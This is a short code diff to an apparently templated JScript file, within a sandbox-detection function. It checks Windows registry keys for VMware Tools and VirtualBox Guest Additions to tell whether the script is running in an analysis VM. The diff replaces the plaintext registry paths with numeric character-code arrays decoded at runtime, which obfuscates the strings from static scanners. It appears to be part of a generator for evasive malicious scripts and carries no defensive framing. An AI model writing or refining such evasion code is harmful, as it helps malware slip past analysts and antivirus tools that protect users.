@@ -44,12 +44,12 @@ function {{ v.fn_sandbox }}() {
     // VM registry key checks
     try {
         var sh = new ActiveXObject("WScript.Shell");
-        sh.RegRead("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath");
+        sh.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104]));
         return true;
     } catch(e) {}
     try {
         var sh2 = new ActiveXObject("WScript.Shell");
-        sh2.RegRead("HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version");
+        sh2.RegRead({{ v.fn_build_str }}([72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110]));
         return true;
     } catch(e) {}
     try {
